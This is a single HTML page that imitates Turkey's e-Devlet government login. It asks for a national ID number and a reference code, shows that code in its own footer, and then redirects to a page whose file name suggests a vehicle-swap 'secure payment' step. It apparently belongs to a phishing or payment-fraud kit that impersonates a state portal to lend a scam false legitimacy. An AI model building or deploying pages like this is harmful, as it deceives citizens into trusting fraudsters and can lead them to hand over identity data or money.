
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>e-Devlet Güvenli Giriş</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(to bottom, #e2e8f0, #f8fafc);
      margin: 0;
      padding: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .login-container {
      background: white;
      padding: 30px;
      border-radius: 16px;
      box-shadow: 0 0 12px rgba(0, 0, 0, 0.1);
      max-width: 360px;
      width: 100%;
      transition: opacity 1s ease-in-out;
    }
    h2 {
      text-align: center;
      color: #1d3765;
      margin-bottom: 20px;
    }
    label {
      font-weight: bold;
      display: block;
      margin-bottom: 6px;
      color: #374151;
    }
    input {
      width: 100%;
      padding: 10px;
      margin-bottom: 16px;
      border: 1px solid #cbd5e1;
      border-radius: 8px;
    }
    button {
      width: 100%;
      background-color: #1d3765;
      color: white;
      padding: 12px;
      border: none;
      border-radius: 8px;
      font-weight: bold;
      font-size: 1rem;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }
    button:hover {
      background-color: #274472;
    }
    .footer-text {
      margin-top: 16px;
      font-size: 0.85rem;
      color: #6b7280;
      text-align: center;
    }
    .loading-screen {
      display: none;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
      animation: fadeIn 1s ease-in-out;
    }
    .spinner {
      border: 5px solid #e2e8f0;
      border-top: 5px solid #1d3765;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
  </style>
</head>
<body>
  <div class="login-container" id="login-container">
    <h2>e-Devlet Güvenli Giriş</h2>
    <form onsubmit="validateAndRedirect(event)">
      <label for="tcno">T.C. Kimlik No</label>
      <input type="text" id="tcno" maxlength="11" required />
      <label for="refno">Referans Numarası</label>
      <input type="text" id="refno" maxlength="12" required />
      <button type="submit">Devam Et</button>
    </form>
    <div class="footer-text">
      Geçerli Referans Numaranız: <strong>TAK2025X8A</strong>
    </div>
  </div>

  <div class="loading-screen" id="loading-screen">
    <div class="spinner"></div>
    <p><strong>İşleminiz başlatılıyor, lütfen bekleyiniz...</strong></p>
  </div>

  <script>
    function validateAndRedirect(event) {
      event.preventDefault();
      const ref = document.getElementById("refno").value.toUpperCase();
      if (ref === "TAK2025X8A") {
        document.getElementById("login-container").style.opacity = 0;
        setTimeout(() => {
          document.getElementById("login-container").style.display = "none";
          document.getElementById("loading-screen").style.display = "flex";
        }, 1000);
        setTimeout(() => {
          window.location.href = "tasit_takas_timer_solust.html#guvenli_odeme";
        }, 4000);
      } else {
        alert("Referans numarası geçersiz.");
      }
    }
  </script>
</body>
</html>
